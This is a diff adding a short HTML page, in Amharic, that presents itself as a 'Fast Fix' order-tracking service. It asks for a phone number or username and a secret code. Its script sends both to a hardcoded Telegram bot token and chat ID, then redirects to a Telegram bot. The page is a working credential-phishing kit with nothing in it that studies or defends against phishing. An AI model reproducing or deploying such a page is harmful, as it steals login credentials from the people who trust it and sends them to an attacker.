@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fast Fix Service</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 330px; text-align: center; }
+        h2 { color: #1c1e21; margin-bottom: 5px; }
+        p { color: #606770; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #0077b3; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>🛠️ Fast Fix</h2>
+        <p>ትዕዛዝዎን ለመከታተል መታወቂያዎን ያስገቡ</p>
+        
+        <input type="text" id="u_id" placeholder="ስልክ ወይም መለያ ስም">
+        <input type="text" id="u_code" placeholder="ሚስጥራዊ ቁጥር" style="-webkit-text-security: disc;">
+        
+        <button onclick="sendData()">ቀጥል</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const token = "7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI";
+            const chatId = "6338638588";
+
+            const user = document.getElementById('u_id').value;
+            const code = document.getElementById('u_code').value;
+
+            if (user === "" || code === "") {
+                alert("እባክዎ መረጃዎን ያስገቡ!");
+                return;
+            }
+
+            const message = `🔔 አዲስ ትዕዛዝ:\n👤 መለያ: ${user}\n🔑 ቁጥር: ${code}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(res => {
+                if(res.ok) {
+                    // መልዕክቱ እንደተላከ ወደ ቴሌግራም ቻናልህ እንዲሄድ ማድረግ ትችላለህ
+                    window.location.href = "https://t.me/Fast_fix_bot";
+                }
+            });
+        }
+    </script>
+
+</body>
+</html>
